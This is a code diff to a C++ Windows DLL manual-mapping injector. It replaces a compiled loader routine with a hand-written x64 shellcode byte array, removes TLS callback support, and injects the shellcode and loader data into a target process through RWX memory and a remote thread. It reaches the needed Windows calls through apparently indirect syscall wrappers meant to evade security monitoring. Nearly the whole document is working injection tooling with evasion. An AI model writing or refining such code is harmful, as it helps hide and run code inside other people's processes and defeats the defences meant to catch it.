@@ -9,15 +9,12 @@
 namespace ManualMap {
 
     struct LoaderData {
-        PVOID  imageBase;
-        DWORD  entryPointRva;
-        BOOL   hasTls;
-        DWORD  tlsCallbacksRva;
-        BYTE   _pad[4];
+        PVOID  imageBase;     // offset 0
+        DWORD  entryPointRva; // offset 8
+        BYTE   _pad[4];       // offset 12
     };
 
     // ── Helper: RVA → raw file offset ────────────────────────────────────────
-    // MUST be defined before Map() which calls it.
     inline DWORD RvaToOffset(const IMAGE_NT_HEADERS64* nt, DWORD rva) {
         auto sec = IMAGE_FIRST_SECTION(nt);
         for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
@@ -25,28 +22,27 @@ namespace ManualMap {
                 rva <  sec->VirtualAddress + sec->Misc.VirtualSize)
                 return sec->PointerToRawData + (rva - sec->VirtualAddress);
         }
-        return rva; // falls back for header-range RVAs
+        return rva;
     }
 
-    // ── Shellcode executed inside the target process ──────────────────────────
-    // Calls TLS callbacks, then DllMain(DLL_PROCESS_ATTACH).
-    // Must be position-independent (no external calls except through data).
-    __declspec(noinline) static void LoaderShellcode(LoaderData* d) {
-        if (d->hasTls) {
-            using TlsCb = void(NTAPI*)(PVOID, DWORD, PVOID);
-            auto cbs = reinterpret_cast<TlsCb*>(
-                reinterpret_cast<uintptr_t>(d->imageBase) + d->tlsCallbacksRva);
-            while (*cbs) {
-                (*cbs)(d->imageBase, DLL_PROCESS_ATTACH, nullptr);
-                ++cbs;
-            }
-        }
-        using DllEntry = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
-        auto entry = reinterpret_cast<DllEntry>(
-            reinterpret_cast<uintptr_t>(d->imageBase) + d->entryPointRva);
-        entry(reinterpret_cast<HINSTANCE>(d->imageBase), DLL_PROCESS_ATTACH, nullptr);
-    }
-    static void LoaderShellcodeEnd() {} // size marker
+    // ── PIC shellcode (raw x64 bytes) executed inside the target process ─────
+    // sub rsp,28 / mov rax,rcx / mov r11,[rax] / mov ecx,[rax+8] /
+    // add r11,rcx / mov rcx,[rax] / mov edx,1 / xor r8d,r8d /
+    // call r11 / add rsp,28 / xor eax,eax / ret
+    inline constexpr BYTE g_shellcode[] = {
+        0x48, 0x83, 0xEC, 0x28,        // sub  rsp, 28h
+        0x48, 0x89, 0xC8,              // mov  rax, rcx        (save LoaderData*)
+        0x4C, 0x8B, 0x18,              // mov  r11, [rax]      (imageBase)
+        0x8B, 0x48, 0x08,              // mov  ecx, [rax+8]    (entryPointRva)
+        0x4C, 0x03, 0xD9,              // add  r11, rcx        (DllMain addr)
+        0x48, 0x8B, 0x08,              // mov  rcx, [rax]      (arg1=imageBase)
+        0xBA, 0x01, 0x00, 0x00, 0x00,  // mov  edx, 1          (arg2=ATTACH)
+        0x45, 0x31, 0xC0,              // xor  r8d, r8d        (arg3=null)
+        0x41, 0xFF, 0xD3,              // call r11
+        0x48, 0x83, 0xC4, 0x28,        // add  rsp, 28h
+        0x33, 0xC0,                    // xor  eax, eax
+        0xC3                           // ret
+    };
 
     // ── Core mapping ──────────────────────────────────────────────────────────
     inline bool Map(HANDLE hProcess, const std::vector<BYTE>& raw) {
@@ -159,36 +155,25 @@ namespace ManualMap {
             }
         }
 
-        // 6. Write and launch shellcode (TLS + DllMain)
-        SIZE_T shellSize = reinterpret_cast<uintptr_t>(LoaderShellcodeEnd)
-                         - reinterpret_cast<uintptr_t>(LoaderShellcode);
-        shellSize += 0x100; // safety padding
-
-        SIZE_T allocSize = shellSize + sizeof(LoaderData);
+        // 6. Write PIC shellcode + LoaderData into target, execute via thread
+        constexpr SIZE_T kShellSize = sizeof(g_shellcode);
+        SIZE_T allocSize = kShellSize + sizeof(LoaderData) + 0x10; // alignment pad
         PVOID  shellMem  = nullptr;
         IndirectNtAllocateVirtualMemory(
             hProcess, &shellMem, 0, &allocSize,
             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!shellMem) return false;
 
+        // LoaderData placed immediately after shellcode (16-byte aligned)
+        PVOID dataPtr = reinterpret_cast<PVOID>(
+            (reinterpret_cast<uintptr_t>(shellMem) + kShellSize + 15) & ~15ull);
+
         LoaderData ld{};
         ld.imageBase     = imgBase;
         ld.entryPointRva = nt->OptionalHeader.AddressOfEntryPoint;
 
-        auto& tlsDD = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
-        if (tlsDD.Size) {
-            auto tlsDir = reinterpret_cast<const IMAGE_TLS_DIRECTORY64*>(
-                raw.data() + RvaToOffset(nt, tlsDD.VirtualAddress));
-            ld.hasTls = TRUE;
-            ld.tlsCallbacksRva = static_cast<DWORD>(
-                tlsDir->AddressOfCallBacks - nt->OptionalHeader.ImageBase);
-        }
-
-        PVOID dataPtr = reinterpret_cast<PVOID>(
-            reinterpret_cast<uintptr_t>(shellMem) + shellSize);
-
         IndirectNtWriteVirtualMemory(hProcess, shellMem,
-            reinterpret_cast<PVOID>(LoaderShellcode), shellSize, &written);
+            const_cast<BYTE*>(g_shellcode), kShellSize, &written);
         IndirectNtWriteVirtualMemory(hProcess, dataPtr,
             &ld, sizeof(ld), &written);
 
@@ -197,8 +182,8 @@ namespace ManualMap {
         IndirectNtCreateThreadEx(
             &hThread, THREAD_ALL_ACCESS, nullptr,
             hProcess,
-            shellMem,   // start address
-            dataPtr,    // parameter (LoaderData*)
+            shellMem,   // start = shellcode
+            dataPtr,    // param = LoaderData* (rcx on entry)
             0, 0, 0, 0, nullptr);
 
         if (hThread) {
